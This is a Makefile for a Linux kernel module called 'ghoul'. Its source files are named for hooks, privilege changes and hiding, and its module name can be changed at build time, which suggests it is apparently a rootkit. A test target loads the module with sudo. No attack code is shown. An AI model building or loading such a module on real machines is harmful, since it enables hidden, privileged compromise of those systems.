ifdef GHOUL_MODULE_NAME
module_name = $(GHOUL_MODULE_NAME)
else
module_name = ghoul
endif
obj-m += $(module_name).o
$(module_name)-objs := ./src/$(module_name).o ./src/load.o ./src/hooks.o ./src/service.o ./src/privileges.o ./src/hide.o
KVERSION = $(shell uname -r)

all:
ifneq ($(module_name), ghoul)
		$(shell cp src/ghoul.c src/$(module_name).c)
endif
		make -C /lib/modules/$(KVERSION)/build M=$(PWD) modules

clean:
		make -C /lib/modules/$(KVERSION)/build M=$(PWD) clean
ifneq ($(module_name), ghoul)
		rm src/$(module_name).c
endif

test: all
		sudo insmod $(module_name).ko
		-python3 -m pytest
		python3 ghoulctl.py unload